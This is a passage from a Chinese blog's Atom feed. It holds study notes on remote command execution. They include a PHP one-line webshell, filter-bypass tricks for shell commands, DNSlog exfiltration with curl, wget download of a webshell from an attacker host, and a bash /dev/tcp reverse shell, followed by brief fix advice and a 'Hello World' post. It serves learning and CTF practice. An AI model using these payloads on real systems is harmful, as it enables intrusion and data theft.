class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=ver 不要在命令两边加引号，否则无法执行</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">system/<span class="title function_ invoke__">passthru</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>​执行操作系统命令，但不会输出任何内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;命令&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>​执行操作系统命令，返回执行结果，但不会输出。</p><p>​可使用 <code>echo shell_exec(&quot;命令&quot;);</code> 将执行结果输出。</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><blockquote><p>Windows 会把 echo 后的东西原封不动输出。</p><p>下面的内容仅针对 Linux 。</p></blockquote><h2 id="通用绕过方式"><a href="#通用绕过方式" class="headerlink" title="通用绕过方式"></a>通用绕过方式</h2><h3 id="加引号"><a href="#加引号" class="headerlink" title="加引号"></a>加引号</h3><p>​单、双引号均可，如 <code>who&#39;&#39;ami</code> 。</p><p>​引号内为空，系统会忽略引号。</p><h3 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h3><p>​&#x2F; 表示路径，\ 表示转义符。如果 \ 后面跟的是没有转义意义的字符，则会忽略 \ 。</p><blockquote><p>以下几种过滤情况都可以尝试通用绕过方式。</p></blockquote><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>​可用 $IFS 替代空格。</p><p>​注意，对于 <code>echo 12$IFS34 </code> ，输出 <code>12</code> 而不是 <code>12 34</code>，因为系统会认为 $ 后面的都是变量名，而前面又没定义变量，所以不会输出任何东西，怎么办呢？</p><h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>​<code>echo 12$IFS&quot;&quot;34</code> ，引号会截断变量名。</p><h3 id="局部变量法"><a href="#局部变量法" class="headerlink" title="局部变量法"></a>局部变量法</h3><p>​<code>a=34;echo 12$IFS$a</code></p><h3 id="大括号绕过"><a href="#大括号绕过" class="headerlink" title="大括号绕过"></a>大括号绕过</h3><p>​<code>echo 12$&#123;IFS&#125;34</code> ，限定变量范围。</p><h3 id="添加内置变量"><a href="#添加内置变量" class="headerlink" title="添加内置变量"></a>添加内置变量</h3><p>​<code>echo 12$IFS$134</code>，<code>$1</code>~&#96;$9<code>、</code>$@<code>、</code>$*&#96; 都是内置变量，可截断变量名。</p><h3 id="和-绕过"><a href="#和-绕过" class="headerlink" title="&lt;&gt; 和 &lt; 绕过"></a>&lt;&gt; 和 &lt; 绕过</h3><p>​&lt;&gt; 和 &lt; 可替代空格。</p><h2 id="过滤命令"><a href="#过滤命令" class="headerlink" title="过滤命令"></a>过滤命令</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 命令|<span class="built_in">base64</span>  <span class="comment">#输出命令进行base64加密后的密文</span></span><br><span class="line"><span class="built_in">echo</span> 加密后的命令|<span class="built_in">base64</span> -d|bash  <span class="comment">#先解密命令，再输出命令由bash执行的结果</span></span><br><span class="line"><span class="built_in">echo</span>$IFS<span class="variable">$1</span>加密后的命令|<span class="built_in">base64</span>$IFS<span class="variable">$1</span>-d|bash  <span class="comment">#同时过滤了空格时</span></span><br></pre></td></tr></table></figure><h4 id="hex-16进制"><a href="#hex-16进制" class="headerlink" title="hex 16进制"></a>hex 16进制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0x加密后的命令|xxd -r -p|bash <span class="comment">#先解密命令，再输出命令由bash执行的结果</span></span><br><span class="line"><span class="comment">#或 </span></span><br><span class="line"><span class="comment">#已知16进制编码下l为6c，s为73</span></span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\x6c\x73&quot;</span>) <span class="comment">#输出ls的执行结果</span></span><br></pre></td></tr></table></figure><h4 id="oct-8进制"><a href="#oct-8进制" class="headerlink" title="oct 8进制"></a>oct 8进制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#已知 (printf ls) 或 (echo ls) 为输出ls的执行结果</span></span><br><span class="line"><span class="comment">#8进制编码下l为154，s为163</span></span><br><span class="line">(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>) <span class="comment">#输出ls的执行结果</span></span><br></pre></td></tr></table></figure><h3 id="局部变量绕过"><a href="#局部变量绕过" class="headerlink" title="局部变量绕过"></a>局部变量绕过</h3><p>​将命令拆分为多个变量，通过输入变量名的方式绕过。</p><p>​<code>cat flag.txt</code> ，可拆解为 <code>a=c;b=a;c=t;d=.txt;e=ag;f=fl;$a$b$c$IFS$f$e$d</code> 。</p><h3 id="内置变量绕过"><a href="#内置变量绕过" class="headerlink" title="内置变量绕过"></a>内置变量绕过</h3><p>​内置变量如上述，<code>cat flag.txt</code> 可添加为如 <code>c$1a$2t flag.txt </code> 。</p><h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><h4 id="跨行"><a href="#跨行" class="headerlink" title="跨行"></a>跨行</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> \</span><br><span class="line">&gt; f\</span><br><span class="line">&gt; lag\</span><br><span class="line">&gt; .txt</span><br><span class="line">flag is here!</span><br></pre></td></tr></table></figure><h4 id="单行"><a href="#单行" class="headerlink" title="单行"></a>单行</h4><p>​<code>c\a\t flag.txt</code></p><h3 id="使用绝对路径加载命令"><a href="#使用绝对路径加载命令" class="headerlink" title="使用绝对路径加载命令"></a>使用绝对路径加载命令</h3><p>​<code>/bin/cat flag.txt</code></p><h3 id="命令代替绕过"><a href="#命令代替绕过" class="headerlink" title="命令代替绕过"></a>命令代替绕过</h3><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>​more、head、tail、rev、nl、sort、uniq、od</p><p>​hexdump -b file：以 8 进制显示文件内容。</p><p>​xxd file：以 16 进制显示文件内容。</p><p>​file -f file：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file -f flag.txt</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;: cannot open <span class="string">&#x27;flag&#123;this_1s_f1@9&#125;&#x27;</span> (No such file or directory)</span><br></pre></td></tr></table></figure><p>​awk NR file：效果跟 <code>cat file</code> 一样。</p><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>​dir</p><h2 id="过滤flag关键字"><a href="#过滤flag关键字" class="headerlink" title="过滤flag关键字"></a>过滤flag关键字</h2><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>​<code>cat ????.???</code> </p><p>​<code>cat /f*</code></p><h3 id="和-绕过-1"><a href="#和-绕过-1" class="headerlink" title="[] 和 {} 绕过"></a>[] 和 {} 绕过</h3><p>​类似正则匹配，[] 匹配其内一个字符，{} 匹配其内所有字符，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> f[l,s]ag.txt <span class="comment">#或cat f[a-z]ag.txt</span></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> f&#123;l,s&#125;ag.txt</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">flag&#123;this_1s_f1@9&#125;</span><br><span class="line"><span class="built_in">cat</span>: fsag.txt: 没有那个文件或目录</span><br></pre></td></tr></table></figure><h3 id="字符串反序绕过"><a href="#字符串反序绕过" class="headerlink" title="字符串反序绕过"></a>字符串反序绕过</h3><p>​<code>cat flag.txt</code> 的反序为 <code>txt.galf tac</code> ，配合 rev 命令使其正序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt.galf <span class="built_in">tac</span>|rev|bash</span><br></pre></td></tr></table></figure><h3 id="字符串截取绕过"><a href="#字符串截取绕过" class="headerlink" title="字符串截取绕过"></a>字符串截取绕过</h3><p>​假设 ls 的执行结果为 flag.txt ，则可构造 <code>cat $(expr substr $(ls) 1 8)</code> 。</p><h3 id="和-绕过-2"><a href="#和-绕过-2" class="headerlink" title="&#96;&#96; 和 $() 绕过"></a>&#96;&#96; 和 $() 绕过</h3><p>​如果 ls 的结果为 flag.txt，则可 cat `ls&#96; 或 cat $(ls) ，还可 ls|xargs cat 。</p><blockquote><p>xargs：进行标准输出格式转换。</p><p><code>ls|xargs cat</code>：通过管道符获取 ls 命令的标准输出，再通过 xargs 命令对标准输出格式化为 cat 命令的参数。</p></blockquote><h2 id="命令无回显"><a href="#命令无回显" class="headerlink" title="命令无回显"></a>命令无回显</h2><h3 id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p>​Linux 下结合 sleep 命令。</p><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><p>​攻击机执行 <code>nc -lvp 7777</code> 开启监听，目标机执行 <code>curl ip:7777</code> 发出 HTTP 请求，如果攻击机收到请求则说明命令有执行。</p><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><blockquote><p>域名级别：</p><p>一级域名是互联网上的最高级别的域名。它是域名中最右边的部分，例如 “.com”、”.org”、”.net” 。一级域名是由顶级域名注册机构（例如 Verisign、Public Interest Registry 等）进行管理和分配的。</p><p>二级域名是一级域名下面的一个级别。它位于一级域名的左边，是一个有独立含义的名称。例如，在 “example.com” 中，”example” 是二级域名。</p><p>三级域名是在二级域名下再划分的一个级别。它位于二级域名的左边，是更加具体的子域名。例如，在 “blog.example.com” 中，”blog” 是三级域名。</p><p>域名的层级结构可以继续扩展，例如四级域名、五级域名，以此类推。每个级别的域名都可以有自己的独立设置和管理，用于指向不同的网络资源或服务。</p></blockquote><p>​如果 HTTP 请求的目标不是 IP 地址而是域名，则需要调用域名解析服务（DNS）将域名转换为 IP 地址。</p><p>​DNSlog，域名解析服务日志。在 ping 或 curl 一个域名时，就会调用域名解析服务。请求类似 DNSlog.cn 这些带有 DNSlog 的站点里的域名时，可以在这些站点里查看 DNSlog 。 </p><h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h3><h4 id="DNSlog-1"><a href="#DNSlog-1" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>​如 curl `whoami&#96;.xxx.dnslog.cn 。</p><h4 id="内容迁移"><a href="#内容迁移" class="headerlink" title="内容迁移"></a>内容迁移</h4><p>​将 flag.php 的内容迁移到浏览器可直接访问的文件中。</p><ul><li><code>cp flag.php 1.txt</code> → <code>localhost/1.txt</code> </li><li><code>mv flag.php flag.txt</code> → <code>localhost/flag.txt</code></li><li><code>tar cvf flag.tar flag.php</code> → <code>localhost/flag.tar</code></li><li><code>tar zcvf flag.tar.gz flag.php</code> → <code>localhost/flag.tar.gz</code></li><li><code>zip flag.zip flag.php</code> → <code>localhost/flag.zip</code></li></ul><h3 id="直接写入-webshell"><a href="#直接写入-webshell" class="headerlink" title="直接写入 webshell"></a>直接写入 webshell</h3><p>​传入 <code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; webshell.php</code> ，然后对 webshell.php 进程操控。</p><h3 id="外部下载-webshell"><a href="#外部下载-webshell" class="headerlink" title="外部下载 webshell"></a>外部下载 webshell</h3><p>​传入 <code>wget 攻击机ip -O webshell.php </code> ，下载攻击机上的 webshell.php 到目标机上。</p><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><ol><li><p>攻击机监听端口：<code>nc -lvp 777</code> 。</p></li><li><p>目标机上执行命令：<code>bash -i &gt;&amp; /dev/tcp/攻击机ip/777 0&gt;&amp;1</code> 。接下来在目标机上执行的所有命令的结果都将被重定向到 <code>/dev/tcp/攻击机ip/777</code> 指定的攻击机上。</p><blockquote><ul><li><code>bash</code>：用于启动 Bash Shell 。</li><li><code>-i</code>：<code>bash</code> 命令的选项，表示以交互模式运行。这将使得 Shell 在连接建立后保持交互状态，可以接收输入和输出。</li><li><code>&gt;&amp;</code>：重定向符号，用于将输出重定向到某个地方。</li><li><code>/dev/tcp/攻击机ip/777</code>：这是一个特殊的文件路径，用于指定要重定向到的目标地址和端口。在这里，<code>/dev/tcp</code> 是一个虚拟文件系统，<code>攻击机ip</code> 是攻击机的 IP 地址，<code>777</code> 是要连接的目标端口号。</li><li><code>0&gt;&amp;1</code>：另一个重定向符号，表示将输入重定向到与输出相同的位置。</li></ul></blockquote></li></ol><h2 id="无数字字母"><a href="#无数字字母" class="headerlink" title="无数字字母"></a>无数字字母</h2><p>​异或绕过、或绕过、取反绕过、自增绕过。</p><p>​对传入参数进行上述操作后再传入。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>在执行相关函数前，对传入的变量值做好过滤，对敏感字符进行转义。</li><li>不能完全控制的危险函数最好不要使用。</li><li>进行权限控制，如文件读写权限、目录访问权限。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;​		RCE，Remote Command&amp;#x2F;Code Execute，远程命令&amp;#x2F;代码执行。&lt;/p&gt;
&lt;h1 id=&quot;命令</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2023/12/10/HelloWorld/"/>
    <id>http://example.com/2023/12/10/HelloWorld/</id>
    <published>2023-12-09T16:00:00.000Z</published>
    <updated>2023-12-17T04:33:36.540Z</updated>
    
    <content type="html"><![CDATA[<p>​Hello, World!</p><p>​这是我的第一篇博客，从今天开始就一起探索未知的世界吧！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		Hello, World!&lt;/p&gt;
&lt;p&gt;​		这是我的第一篇博客，从今天开始就一起探索未知的世界吧！&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
